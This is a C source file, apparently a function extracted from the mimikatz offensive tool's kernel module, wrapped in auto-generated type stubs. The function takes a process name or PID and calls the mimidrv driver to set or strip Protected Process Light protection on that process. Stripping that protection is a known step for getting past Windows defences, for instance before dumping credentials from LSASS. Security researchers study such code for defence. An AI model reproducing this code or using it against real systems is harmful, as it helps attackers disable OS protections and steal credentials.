
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_11__ TYPE_5__ ;
typedef struct TYPE_10__ TYPE_4__ ;
typedef struct TYPE_9__ TYPE_3__ ;
typedef struct TYPE_8__ TYPE_2__ ;
typedef struct TYPE_7__ TYPE_1__ ;


typedef int wchar_t ;
struct TYPE_9__ {int Type; int Signer; scalar_t__ Audit; } ;
struct TYPE_10__ {int SignatureLevel; int SectionSignatureLevel; TYPE_3__ Protection; } ;
struct TYPE_8__ {int member_2; int member_1; int member_0; } ;
struct TYPE_7__ {TYPE_2__ member_2; int member_1; int member_0; } ;
struct TYPE_11__ {TYPE_4__ SignatureProtection; scalar_t__ processId; TYPE_1__ member_1; int member_0; } ;
typedef int PCWCHAR ;
typedef int NTSTATUS ;
typedef TYPE_5__ MIMIDRV_PROCESS_PROTECT_INFORMATION ;
typedef scalar_t__ BOOL ;


 int IOCTL_MIMIDRV_PROCESS_PROTECT ;
 scalar_t__ KULL_M_WIN_MIN_BUILD_8 ;
 scalar_t__ KULL_M_WIN_MIN_BUILD_BLUE ;
 scalar_t__ KULL_M_WIN_MIN_BUILD_VISTA ;
 scalar_t__ MIMIKATZ_NT_BUILD_NUMBER ;
 int PRINT_ERROR (char*) ;
 int PRINT_ERROR_AUTO (char*) ;
 int STATUS_SUCCESS ;
 int kprintf (char*,scalar_t__,...) ;
 int kull_m_kernel_mimidrv_simple_output (int ,TYPE_5__*,int) ;
 int kull_m_process_getProcessIdForName (int ,scalar_t__*) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,int *,int *) ;
 scalar_t__ wcstoul (int ,int *,int ) ;

NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
{
 MIMIDRV_PROCESS_PROTECT_INFORMATION protectInfos = {0, {0, 0, {0, 0, 0}}};
 PCWCHAR szProcessName, szPid;
 BOOL isUnprotect;

 if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
 {
  isUnprotect = kull_m_string_args_byName(argc, argv, L"remove", ((void*)0), ((void*)0));
  if(kull_m_string_args_byName(argc, argv, L"process", &szProcessName, ((void*)0)))
  {
   kprintf(L"Process : %s\n", szProcessName);
   if(!kull_m_process_getProcessIdForName(szProcessName, &protectInfos.processId))
    PRINT_ERROR_AUTO(L"kull_m_process_getProcessIdForName");
  }
  else if(kull_m_string_args_byName(argc, argv, L"pid", &szPid, ((void*)0)))
  {
   protectInfos.processId = wcstoul(szPid, ((void*)0), 0);
  }
  else PRINT_ERROR(L"Argument /process:program.exe or /pid:processid needed\n");

  if(protectInfos.processId)
  {
   if(!isUnprotect)
   {
    if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
    {
     protectInfos.SignatureProtection.SignatureLevel = 1;
    }
    else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
    {
     protectInfos.SignatureProtection.SignatureLevel = 0x0f;
     protectInfos.SignatureProtection.SectionSignatureLevel = 0x0f;
    }
    else
    {
     protectInfos.SignatureProtection.SignatureLevel = 0x3f;
     protectInfos.SignatureProtection.SectionSignatureLevel = 0x3f;

     protectInfos.SignatureProtection.Protection.Type = 2;
     protectInfos.SignatureProtection.Protection.Audit = 0;
     protectInfos.SignatureProtection.Protection.Signer = 6;
    }
   }
   kprintf(L"PID %u -> %02x/%02x [%1x-%1x-%1x]\n", protectInfos.processId, protectInfos.SignatureProtection.SignatureLevel, protectInfos.SignatureProtection.SectionSignatureLevel, protectInfos.SignatureProtection.Protection.Type, protectInfos.SignatureProtection.Protection.Audit, protectInfos.SignatureProtection.Protection.Signer);
   kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_PROTECT, &protectInfos, sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION));
  }
  else PRINT_ERROR(L"No PID\n");
 }
 else PRINT_ERROR(L"Protected process not available before Windows Vista\n");
 return STATUS_SUCCESS;
}
